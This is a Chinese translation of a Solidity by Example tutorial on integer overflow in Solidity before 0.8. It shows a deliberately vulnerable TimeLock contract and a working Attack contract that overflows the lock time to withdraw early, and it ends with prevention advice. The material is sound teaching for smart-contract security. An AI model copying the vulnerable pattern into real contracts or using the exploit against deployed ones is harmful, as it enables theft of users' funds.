# 算术溢出与下溢

对应英文原页：https://solidity-by-example.org/hacks/overflow

## 漏洞

### Solidity < 0.8

Solidity 中的整数会溢出 / 下溢且不报错。

### Solidity >= 0.8

Solidity 0.8 对溢出 / 下溢的默认行为是抛出错误。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// 该合约被设计成一个时间金库。
// 用户可以向该合约存款，但至少一周内不能提取。
// 用户还可以把等待时间延长到超过一周。

/*
1. 部署 TimeLock
2. 使用 TimeLock 的地址部署 Attack
3. 调用 Attack.attack 并发送 1 ether。你将能够立即
   提取你的 ether。

发生了什么？
Attack 使 TimeLock.lockTime 溢出，从而能够在
一周等待期结束前提取。
*/

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        若 t = 当前锁定时间，则需要找到 x 使得
        x + t = 2**256 = 0
        因此 x = -t
        2**256 = type(uint).max + 1
        因此 x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

## 预防措施

- 使用 [SafeMath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/math/SafeMath.sol) 可以防止算术溢出和下溢

- Solidity 0.8 默认会在溢出 / 下溢时抛出错误

---
## 关注我们
[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)


[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
